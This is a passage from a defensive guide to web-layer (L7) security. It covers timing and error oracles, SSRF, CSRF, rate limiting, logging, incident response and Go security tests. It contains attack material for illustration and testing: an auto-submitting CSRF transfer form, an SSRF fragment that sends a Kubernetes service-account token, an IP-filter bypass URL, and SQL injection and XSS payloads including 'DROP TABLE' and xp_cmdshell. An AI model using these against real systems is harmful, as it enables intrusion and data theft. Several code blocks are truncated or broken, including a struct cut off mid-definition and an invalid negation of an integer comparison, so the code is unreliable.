            http.Error(w, "Host header must be a hostname, not IP", http.StatusBadRequest)
            return
        }
        
        allowed := map[string]bool{
            "payment-service.internal": true,
            "payment-service":          true,
        }
        if !allowed[host] {
            http.Error(w, "Invalid host", http.StatusBadRequest)
            return
        }
        
        next.ServeHTTP(w, r)
    })
}
```

## 13. Side-Channel Attacks at L7

### 13.1 Timing Attacks

**Mechanism:**

Many operations take measurably different amounts of time depending on their inputs. An attacker who can make many requests and measure response times can extract secret information.

**String comparison timing leak:**
```python
# Vulnerable: Python's == operator short-circuits on first differing byte
# "abc" == "abd": compares 'a', 'b', 'c' vs 'a', 'b', 'd' → returns after 3 comparisons
# "abc" == "xyz": returns after 1 comparison (a != x)
# By measuring time, attacker can guess characters one by one

def verify_token_vulnerable(provided, expected):
    return provided == expected  # VULNERABLE

def verify_token_secure(provided, expected):
    import hmac
    # hmac.compare_digest: constant-time comparison, always compares all bytes
    return hmac.compare_digest(provided.encode(), expected.encode())
```

```go
// Go: constant-time comparison
import "crypto/subtle"

func verifyToken(provided, expected []byte) bool {
    // ConstantTimeCompare: compares all bytes regardless of first mismatch
    // Returns 1 (equal) or 0 (not equal)
    return subtle.ConstantTimeCompare(provided, expected) == 1
}

// For HMAC verification:
import "crypto/hmac"
func verifyHMAC(message, providedMAC, key []byte) bool {
    mac := hmac.New(sha256.New, key)
    mac.Write(message)
    expectedMAC := mac.Sum(nil)
    return hmac.Equal(providedMAC, expectedMAC)  // Constant-time
}
```

```
# Attacker can determine if a specific URL is cached:
# If cached → another user recently visited it
# Leak: which admin pages are actively being used
# Or: extract tokens from cache side-channel in complex scenarios
```

**Mitigation:**
```go
// Add jitter to response times for sensitive operations
func sensitiveHandler(w http.ResponseWriter, r *http.Request) {
    start := time.Now()
    
    // Perform operation
    result, err := authenticateUser(r)
    
    // Always wait minimum time regardless of outcome
    minLatency := 100 * time.Millisecond
    elapsed := time.Since(start)
    if elapsed < minLatency {
        time.Sleep(minLatency - elapsed + randomJitter())
    }
    
    if err != nil {
        http.Error(w, "Invalid credentials", http.StatusUnauthorized)
        return
    }
    
    json.NewEncoder(w).Encode(result)
}

func randomJitter() time.Duration {
    n, _ := rand.Int(rand.Reader, big.NewInt(50))
    return time.Duration(n.Int64()) * time.Millisecond
}
```

### 13.2 Error Oracle Attacks

**Mechanism:**

Different error messages or response codes for different error conditions leak information. A "username not found" vs "incorrect password" message tells attackers that a username is valid.

```
# Username enumeration via error messages:
POST /login {"username": "admin", "password": "wrong"}
→ "Incorrect password"          ← Username exists!

POST /login {"username": "nosuchuser", "password": "wrong"}
→ "Username not found"          ← Username doesn't exist

# Enumeration via timing:
# User exists: lookup + password hash compare (slow, Argon2)
# User doesn't exist: lookup only (fast, no hash compare)
# Even with constant-time comparison, the hash itself takes time
```

**Mitigation:**
```go
// Always perform the same operations regardless of whether user exists
func loginHandler(w http.ResponseWriter, r *http.Request) {
    username := r.FormValue("username")
    password := r.FormValue("password")
    
    // Dummy hash to compare against when user doesn't exist
    // (prevents timing difference between user-not-found and wrong-password)
    dummyHash := "$argon2id$v=19$m=65536,t=1,p=4$dummysalt$dummyhash"
    
    user, err := db.FindUser(username)
    
    var hashToCompare string
    if err != nil {
        // User not found: still do a hash comparison to normalize timing
        hashToCompare = dummyHash
    } else {
        hashToCompare = user.PasswordHash
    }
    
    passwordValid := argon2.Verify(password, hashToCompare)
    
    // Only now check if user was found
    if err != nil || !passwordValid {
        // Same error message regardless of which condition failed
        http.Error(w, "Invalid credentials", http.StatusUnauthorized)
        return
    }
    
    // ... create session
}
```

## 14. SSRF and CSRF

### 14.1 SSRF (Server-Side Request Forgery)

**Mechanism:**

SSRF tricks the server into making HTTP requests to attacker-specified destinations. In cloud environments, this is critical because internal services and cloud metadata APIs are accessible from the server.

**Cloud Metadata Service Exploitation:**
```bash

# Attacker can use these credentials for full AWS account access

# Kubernetes: default service account token + API server

  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

**SSRF Bypass Techniques:**

```bash
http://[::ffff:127.0.0.1]/admin
```

**Mitigation (Defense-in-Depth):**
```go
// Go: comprehensive SSRF mitigation

type SSRFSafeHTTPClient struct {
    client *http.Client
}

func NewSSRFSafeClient() *SSRFSafeHTTPClient {
    dialer := &net.Dialer{
        Timeout:   30 * time.Second,
        KeepAlive: 30 * time.Second,
    }
    
    transport := &http.Transport{
        DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
            // Resolve hostname to IPs before connecting
            host, port, err := net.SplitHostPort(addr)
            if err != nil {
                return nil, err
            }
            
            ips, err := net.LookupHost(host)
            if err != nil {
                return nil, err
            }
            
            for _, ip := range ips {
                parsed := net.ParseIP(ip)
                if err := validateIP(parsed); err != nil {
                    return nil, fmt.Errorf("SSRF blocked: %v", err)
                }
            }
            
            return dialer.DialContext(ctx, network, net.JoinHostPort(ips[0], port))
        },
        TLSHandshakeTimeout: 10 * time.Second,
    }
    
    return &SSRFSafeHTTPClient{
        client: &http.Client{
            Transport: transport,
            Timeout:   30 * time.Second,
            // IMPORTANT: don't follow redirects automatically
            CheckRedirect: func(req *http.Request, via []*http.Request) error {
                // Re-validate SSRF on each redirect
                if err := validateURL(req.URL); err != nil {
                    return err
                }
                if len(via) >= 3 {
                    return http.ErrUseLastResponse
                }
                return nil
            },
        },
    }
}

func validateIP(ip net.IP) error {
    blockedRanges := []*net.IPNet{
        parseCIDR("127.0.0.0/8"),       // Loopback
        parseCIDR("10.0.0.0/8"),        // Private
        parseCIDR("172.16.0.0/12"),     // Private
        parseCIDR("192.168.0.0/16"),    // Private
        parseCIDR("169.254.0.0/16"),    // Link-local (AWS metadata)
        parseCIDR("100.64.0.0/10"),     // Shared address space
        parseCIDR("::1/128"),           // IPv6 loopback
        parseCIDR("fc00::/7"),          // IPv6 unique local
        parseCIDR("fe80::/10"),         // IPv6 link-local
        parseCIDR("::ffff:0:0/96"),     // IPv4-mapped IPv6
    }
    
    if ip.IsLoopback() || ip.IsLinkLocalUnicast() || ip.IsLinkLocalMulticast() {
        return fmt.Errorf("IP %s is in blocked range", ip)
    }
    
    for _, blocked := range blockedRanges {
        if blocked.Contains(ip) {
            return fmt.Errorf("IP %s is in blocked range %s", ip, blocked)
        }
    }
    
    return nil
}
```

### 14.2 CSRF (Cross-Site Request Forgery)

**Mechanism:**

CSRF exploits the fact that browsers automatically include cookies with every request to a domain. An attacker's malicious page can trigger authenticated requests to a victim's sessions.

```html
<!-- Malicious page forces GET request (image tag): -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">

<!-- Force POST request (auto-submitting form): -->
<form id="csrf" action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- Bypass SameSite=Lax: top-level navigation via GET -->
<!-- SameSite=Lax allows GET requests from cross-site top-level navigation -->
<!-- If state-changing operations use GET: vulnerable even with SameSite=Lax -->
```

**Mitigation:**
```go
// Go: Synchronizer Token Pattern (CSRF token)
import "github.com/gorilla/csrf"

func main() {
    csrfMiddleware := csrf.Protect(
        []byte("32-byte-long-auth-key"),
        csrf.Secure(true),              // HTTPS only
        csrf.SameSite(csrf.SameSiteStrictMode),
        csrf.MaxAge(3600),
        csrf.ErrorHandler(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            http.Error(w, "Invalid CSRF token", http.StatusForbidden)
        })),
    )
    
    r := mux.NewRouter()
    r.Use(csrfMiddleware)
    
    // Token available in templates via csrf.Token(r)
    // Include in HTML forms: <input type="hidden" name="gorilla.csrf.Token" value="{{.CSRFToken}}">
    // Include in AJAX: X-CSRF-Token header
}
```

```go
// Double-submit cookie pattern (stateless alternative):
// 1. Set a random value in both a cookie and a hidden form field
// 2. On POST: verify cookie value == form field value
// (Cross-site attacker can't read the cookie value due to SOP)

func generateCSRFToken() string {
    b := make([]byte, 32)
    rand.Read(b)
    return base64.URLEncoding.EncodeToString(b)
}

func setCSRFCookie(w http.ResponseWriter) string {
    token := generateCSRFToken()
    http.SetCookie(w, &http.Cookie{
        Name:     "csrf_token",
        Value:    token,
        Path:     "/",
        MaxAge:   3600,
        Secure:   true,
        HttpOnly: false,  // Must be readable by JS for AJAX requests
        SameSite: http.SameSiteStrictMode,
    })
    return token
}

func validateCSRFToken(r *http.Request) error {
    cookie, err := r.Cookie("csrf_token")
    if err != nil {
        return fmt.Errorf("missing CSRF cookie")
    }
    
    headerToken := r.Header.Get("X-CSRF-Token")
    if headerToken == "" {
        headerToken = r.FormValue("csrf_token")
    }
    
    if !subtle.ConstantTimeCompare([]byte(cookie.Value), []byte(headerToken)) {
        return fmt.Errorf("CSRF token mismatch")
    }
    return nil
}
```

## 17. Rate Limiting and Throttling Architecture

### 17.1 Rate Limiting Algorithms

**17.1.1 Token Bucket**

```
- Bucket holds up to N tokens (burst capacity)
- Tokens added at rate R per second
- Each request consumes 1 token
- If bucket empty: reject request
- Allows bursting up to N, then sustained rate R

Implementation:
- Best for: APIs with expected bursts (mobile app startup, webhook delivery)
- Burst-friendly, then rate-limited
```

**17.1.2 Leaky Bucket**

```
- Queue holds up to N requests
- Requests processed at constant rate R per second
- If queue full: reject new requests
- Smooths out bursts

Implementation:
- Best for: Uniform request processing (payment gateways)
- No burst allowed; consistent processing rate
```

**17.1.3 Fixed Window Counter**

```
- Count requests in fixed time window (e.g., 1 minute)
- Reset counter at window boundary
- If count > limit: reject

Problem: boundary spike
  At :59 → 100 requests allowed
  At :00 → counter resets → 100 more requests allowed
  200 requests in 1 second at window boundary
```

**17.1.4 Sliding Window Log**

```
- Store timestamp of each request
- On new request: remove timestamps older than window
- Count remaining timestamps
- If count >= limit: reject

Memory intensive: stores one entry per request
Most accurate: no boundary effects
```

**17.1.5 Sliding Window Counter (Hybrid)**

```
- Two fixed windows: current and previous
- Weighted average: count = prev_count × (1 - elapsed/window) + curr_count
- Memory efficient, approximately correct
- Used by Cloudflare, Redis-based implementations

Best for production: accuracy vs. memory trade-off
```

**Production Implementation:**
```go
// Go: sliding window counter with Redis
type RateLimiter struct {
    rdb    *redis.Client
    limit  int
    window time.Duration
}

func (rl *RateLimiter) Allow(ctx context.Context, key string) (bool, int, error) {
    now := time.Now()
    windowStart := now.Add(-rl.window)
    
    pipe := rl.rdb.Pipeline()
    
    // Remove old entries outside the window
    pipe.ZRemRangeByScore(ctx, key, "0", strconv.FormatInt(windowStart.UnixNano(), 10))
    
    // Count requests in window
    countCmd := pipe.ZCard(ctx, key)
    
    // Add current request (value = timestamp, score = timestamp for ordering)
    pipe.ZAdd(ctx, key, &redis.Z{
        Score:  float64(now.UnixNano()),
        Member: now.UnixNano(),
    })
    
    // Set TTL (cleanup)
    pipe.Expire(ctx, key, rl.window*2)
    
    _, err := pipe.Exec(ctx)
    if err != nil {
        return true, 0, err  // Fail open on Redis error (availability > security for rate limiting)
    }
    
    count := int(countCmd.Val())
    remaining := rl.limit - count
    
    return count < rl.limit, remaining, nil
}
```

## 18. Zero Trust at L7

### 18.1 Zero Trust Principles Applied to L7

```
Traditional perimeter model:
"If you're inside the network, you're trusted"
→ L7 traffic between internal services: no authentication, no encryption

Zero Trust model:
"Never trust, always verify — regardless of network location"
→ Every L7 request: authenticated, authorized, encrypted, logged

Zero Trust L7 requirements:
1. Identity: Every service has a cryptographic identity (SPIFFE SVID)
2. Authentication: Every connection verified (mTLS)
3. Authorization: Every request authorized (OPA, Casbin)
4. Encryption: All traffic encrypted (TLS 1.3)
5. Minimal access: Least-privilege authorization policies
6. Audit: Every request logged with full context
7. Dynamic: Policies enforceable in real-time
```

## 19. Observability and Detection Engineering

### 19.1 What to Log at L7

```
Every HTTP request/response should log:
- Timestamp (ISO 8601, UTC, microsecond precision)
- Request ID (correlation ID, propagated through all services)
- Source IP (real IP, not proxy IP; log both)
- Destination service + endpoint
- HTTP method + path + query params (sanitized)
- Status code + response time (milliseconds)
- Request body size + response body size
- User-Agent
- Authentication context: user_id, tenant_id, service_account
- Authorization result: allowed/denied + policy that decided
- TLS version + cipher suite
- Geographic location (GeoIP enrichment)
- Risk score (WAF, bot detection)

NEVER log:
- Passwords (even hashed)
- Full credit card numbers (PAN)
- Session tokens / API keys (log hash only)
- SSN / national ID numbers
- Full OAuth tokens
```

```go
type RequestLog struct {
    Timestamp      time.Time         `json:"ts"`

func loggingMiddleware(logger *zap.Logger) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            start := time.Now()
            
            // Wrap response writer to capture status code and size
            wrapped := &responseWriter{ResponseWriter: w, statusCode: 200}
            
            next.ServeHTTP(wrapped, r)
            
            latency := time.Since(start).Seconds() * 1000
            
            // Get real IP (behind CDN/proxy)
            realIP := r.Header.Get("CF-Connecting-IP")
            if realIP == "" {
                realIP = r.Header.Get("X-Real-IP")
            }
            
            log := RequestLog{
                Timestamp:    start.UTC(),
                RequestID:    r.Header.Get("X-Request-ID"),
                Method:       r.Method,
                Path:         r.URL.Path,
                StatusCode:   wrapped.statusCode,
                Latency:      latency,
                SourceIP:     r.RemoteAddr,
                RealIP:       realIP,
                UserAgent:    r.Header.Get("User-Agent"),
                RequestBytes: r.ContentLength,
            }
            
            // Get auth context from request context
            if claims, ok := r.Context().Value(claimsKey).(*Claims); ok {
                log.UserID = claims.Subject
            }
            
            logger.Info("http_request",
                zap.String("request_id", log.RequestID),
                zap.String("method", log.Method),
                zap.String("path", log.Path),
                zap.Int("status", log.StatusCode),
                zap.Float64("latency_ms", log.Latency),
                zap.String("source_ip", log.SourceIP),
                zap.String("user_id", log.UserID),
            )
        })
    }
}
```

### 20.1 L7 Attack Response Playbook

**Detection Phase (0-5 minutes):**
```bash
# 1. Identify attack type from initial alert
# 2. Assess scope and impact
# 3. Preserve evidence (do NOT modify logs)

# Snapshot current state:
# Traffic analysis:
netstat -an | grep :443 | sort | uniq -c | sort -rn | head -20
ss -s  # Socket statistics

# Current connections by IP:
netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -20

# Nginx access log analysis (last 5 minutes):
awk -v d="$(date -d '5 minutes ago' '+%d/%b/%Y:%H:%M:%S')" '$4 > "["d' /var/log/nginx/access.log \
  | awk '{print $1}' | sort | uniq -c | sort -rn | head -20

# Top requested paths:
awk '{print $7}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head -20

# Error distribution:
awk '{print $9}' /var/log/nginx/access.log | sort | uniq -c | sort -rn
```

**Containment Phase (5-30 minutes):**
```bash
# Option 1: Block attacking IPs at WAF/CDN level (fastest, no service impact)

# Add to nginx.conf:
deny 203.0.113.0/24;
nginx -s reload  # Zero-downtime reload

# Option 3: Rate limit aggressively at nginx:
limit_req_zone $binary_remote_addr zone=emergency:10m rate=1r/s;

# Option 4: Enable challenge page (CAPTCHA) at CDN level

# Option 5: Fail2ban for automated blocking based on log patterns:
fail2ban-client set nginx-http-auth banip 203.0.113.42
```

**Eradication and Recovery:**
```bash
# After containment:
# 1. Identify root cause (which vulnerability was exploited?)
# 2. Patch vulnerable code/dependency
# 3. Update WAF rules to prevent recurrence
# 4. Rotate any compromised credentials/tokens
```

```go
// Go: security-focused integration tests
func TestSQLInjectionPrevention(t *testing.T) {
    payloads := []string{
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1 UNION SELECT username, password FROM users",
        "' OR 1=1--",
        "1; EXEC xp_cmdshell('whoami')--",
    }
    
    for _, payload := range payloads {
        t.Run(payload, func(t *testing.T) {
            resp, err := client.Get("/api/users?id=" + url.QueryEscape(payload))
            require.NoError(t, err)
            
            // Should return 400 (bad input) or 404 (not found), not 200 (data leak) or 500 (error)
            assert.NotEqual(t, http.StatusOK, resp.StatusCode,
                "SQLi payload should not return 200: %s", payload)
            assert.NotEqual(t, http.StatusInternalServerError, resp.StatusCode,
                "SQLi payload caused 500 (possible injection): %s", payload)
        })
    }
}

func TestXSSPrevention(t *testing.T) {
    payloads := []string{
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",
    }
    
    for _, payload := range payloads {
        // Store payload
        resp, _ := client.Post("/api/comments", "application/json",
            strings.NewReader(fmt.Sprintf(`{"body": %q}`, payload)))
        require.Equal(t, http.StatusCreated, resp.StatusCode)
        
        // Retrieve and verify it's escaped
        var comment Comment
        json.NewDecoder(resp.Body).Decode(&comment)
        
        // In JSON API response: raw content is acceptable (browser won't execute)
        // In HTML response: must be HTML-escaped
        assert.NotContains(t, comment.Body, "<script>",
            "Stored XSS not sanitized")
    }
}

func TestIDORPrevention(t *testing.T) {
    // Create resource as user1
    user1Client := authenticatedClient(t, "user1@example.com")
    resp, _ := user1Client.Post("/api/documents", ...)
    var doc Document
    json.NewDecoder(resp.Body).Decode(&doc)
    
    // Try to access as user2
    user2Client := authenticatedClient(t, "user2@example.com")
    resp2, _ := user2Client.Get("/api/documents/" + doc.ID)
    
    // Must return 403 or 404, not 200
    assert.True(t, resp2.StatusCode == 403 || resp2.StatusCode == 404,
        "IDOR: user2 can access user1's resource (status: %d)", resp2.StatusCode)
}
```
